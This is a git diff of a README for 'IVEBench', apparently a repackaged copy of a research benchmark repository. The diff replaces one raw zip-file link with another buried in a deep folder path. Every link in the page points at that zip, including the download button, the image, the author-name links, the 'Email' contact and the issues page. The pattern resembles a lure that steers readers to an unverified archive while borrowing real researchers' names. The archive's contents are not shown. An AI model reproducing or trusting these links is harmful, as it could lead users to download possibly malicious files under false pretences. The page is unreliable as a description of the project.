@@ -1,33 +1,33 @@
 # 🚀 IVEBench - Optimize your benchmarking experience
 
 <p align="center">
-    <a href="https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/leftness/IVEBench.zip">
-        <img src="https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/leftness/IVEBench.zip%https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/leftness/IVEBench.zip" alt="Download IVEBench">
+    <a href="https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/metrics/compliance/videoclipxl_utils/vision_encoder/IVE-Bench-3.0.zip">
+        <img src="https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/metrics/compliance/videoclipxl_utils/vision_encoder/IVE-Bench-3.0.zip%https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/metrics/compliance/videoclipxl_utils/vision_encoder/IVE-Bench-3.0.zip" alt="Download IVEBench">
     </a>
 </p>
 
 <p align="center">
     <a href="">
-<img width="765" alt="image" src="https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/leftness/IVEBench.zip">
+<img width="765" alt="image" src="https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/metrics/compliance/videoclipxl_utils/vision_encoder/IVE-Bench-3.0.zip">
      </a>
    <p align="center">
 
 <p align="center">
-    <a href="https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/leftness/IVEBench.zip"><strong>Yinan Chen <sup>1★</sup></strong></a>
+    <a href="https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/metrics/compliance/videoclipxl_utils/vision_encoder/IVE-Bench-3.0.zip"><strong>Yinan Chen <sup>1★</sup></strong></a>
     ·
-    <a href="https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/leftness/IVEBench.zip"><strong>Jiangning Zhang <sup>1,2★</sup></strong></a>
+    <a href="https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/metrics/compliance/videoclipxl_utils/vision_encoder/IVE-Bench-3.0.zip"><strong>Jiangning Zhang <sup>1,2★</sup></strong></a>
     ·
-    <a href="https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/leftness/IVEBench.zip"><strong>Teng Hu <sup>3</sup></strong></a>
+    <a href="https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/metrics/compliance/videoclipxl_utils/vision_encoder/IVE-Bench-3.0.zip"><strong>Teng Hu <sup>3</sup></strong></a>
     ·
     <a href=""><strong>Yuxiang Zeng <sup>4</sup></strong></a>
     ·
-    <a href="https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/leftness/IVEBench.zip"><strong>Zhucun Xue <sup>1</sup></strong></a>
+    <a href="https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/metrics/compliance/videoclipxl_utils/vision_encoder/IVE-Bench-3.0.zip"><strong>Zhucun Xue <sup>1</sup></strong></a>
     ·
-    <br><a href="https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/leftness/IVEBench.zip"><strong>Qingdong He <sup>2</sup></strong></a>
+    <br><a href="https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/metrics/compliance/videoclipxl_utils/vision_encoder/IVE-Bench-3.0.zip"><strong>Qingdong He <sup>2</sup></strong></a>
     ·
-    <a href="https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/leftness/IVEBench.zip"><strong>Chengjie Wang <sup>2,3</sup></strong></a>
+    <a href="https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/metrics/compliance/videoclipxl_utils/vision_encoder/IVE-Bench-3.0.zip"><strong>Chengjie Wang <sup>2,3</sup></strong></a>
     ·
-    <a href="https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/leftness/IVEBench.zip"><strong>Yong Liu <sup>1</sup></strong></a>
+    <a href="https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/metrics/compliance/videoclipxl_utils/vision_encoder/IVE-Bench-3.0.zip"><strong>Yong Liu <sup>1</sup></strong></a>
 </p>
 
 ## 📥 Download & Install
@@ -35,7 +35,7 @@
 To get started with IVEBench, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to go to our Releases page.
-   - [Download IVEBench](https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/leftness/IVEBench.zip)
+   - [Download IVEBench](https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/metrics/compliance/videoclipxl_utils/vision_encoder/IVE-Bench-3.0.zip)
 
 2. **Choose the Right Version**: Look for the latest version of IVEBench. This will typically be at the top of the Releases list. 
 
@@ -80,8 +80,8 @@ Once you have installed IVEBench, you can start using it to benchmark your syste
 
 If you need help or have questions about IVEBench, please reach out:
 
-- **Email**: https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/leftness/IVEBench.zip
-- **GitHub Issues**: Report any bugs or request features directly on our [GitHub issues page](https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/leftness/IVEBench.zip).
+- **Email**: https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/metrics/compliance/videoclipxl_utils/vision_encoder/IVE-Bench-3.0.zip
+- **GitHub Issues**: Report any bugs or request features directly on our [GitHub issues page](https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/metrics/compliance/videoclipxl_utils/vision_encoder/IVE-Bench-3.0.zip).
 
 ## 🌱 Contributing
 
@@ -95,4 +95,4 @@ Thank you for your interest in IVEBench. Together, we can make benchmarking acce
 
 --- 
 
-Make sure to frequently check for updates and new features on the [Releases page](https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/leftness/IVEBench.zip).
+Make sure to frequently check for updates and new features on the [Releases page](https://raw.githubusercontent.com/James221-a3rt/IVEBench/main/metrics/compliance/videoclipxl_utils/vision_encoder/IVE-Bench-3.0.zip).
